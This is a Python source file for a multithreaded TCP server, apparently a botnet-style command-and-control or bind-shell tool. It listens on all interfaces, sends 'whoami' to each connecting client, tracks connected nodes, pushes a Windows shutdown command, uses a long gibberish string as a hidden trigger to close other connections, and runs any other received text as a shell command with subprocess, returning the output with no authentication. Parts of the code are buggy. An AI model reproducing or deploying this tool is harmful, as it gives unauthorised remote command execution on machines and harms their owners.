import socket
import threading
import datetime
import subprocess
import time

# Server configuration
HOST = '0.0.0.0'
PORT = 9999

clientsADD = []

# Function to handle client connections
def handle_client(client_socket, address):
    
    # Send command to recheck user and list it
    client_socket.send("whoami".encode())

    # Receive response from client
    response = client_socket.recv(1024).decode()
    #print(f"[+] User: {response}, IP: {address}")
    print(f"[+] Accepted connection from {address} at {datetime.datetime.now()} with Username='{response}'")


    # Add client to the list
    clientsADD.append(address)
    #print(clientsADD)
    while True:
        try:
            data = client_socket.recv(1024)
            if not data:
                break

            command = data.decode()

            if command == "nodes":
                # Send list of connected nodes to the client
                nodes_list = ', '.join([f"('{ip}', {port})" for ip, port in clientsADD])
                client_socket.send(nodes_list.encode())
            if command == "shutdown":
                client_socket.send('shutdown -s /t 10'.encode())
            elif command == "T76r6t66r^&7v76R6r76VR876vr86R65vr6%RV%^vr56R56vr67VR6e^5EV&6E6e67676R5D65f6F65fV6%fv65F^f^tF6tf*76VVF6VR865vr65R86vr65":
                # Close every connection one by one
                for client_ip, client_port, _ in clientsADD:
                    try:
                        if client_ip == address[0] and client_port == address[1]:
                            # Skip closing the current client's connection
                            continue
                        client_close_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        client_close_socket.connect((client_ip, client_port))
                        client_close_socket.send("CLOSE*con".encode())
                        client_close_socket.close()
                    except Exception as e:
                        print(f"Error closing connection with {client_ip}:{client_port}: {e}")
                print("All connections closed")
            else:
                # Execute command and send result back
                result = subprocess.getoutput(command)
                client_socket.send(result.encode())
        except ConnectionResetError:
            print(f"[-] Client {address} disconnected at {datetime.datetime.now()}")
            break

    client_socket.close()
    #print(f"[-] Connection from {address} closed")

# Main function
def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)

    print(f"[*] Listening on {HOST}:{PORT}")

    while True:
        client_socket, address = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, address))
        client_handler.start()

if __name__ == "__main__":
    main()
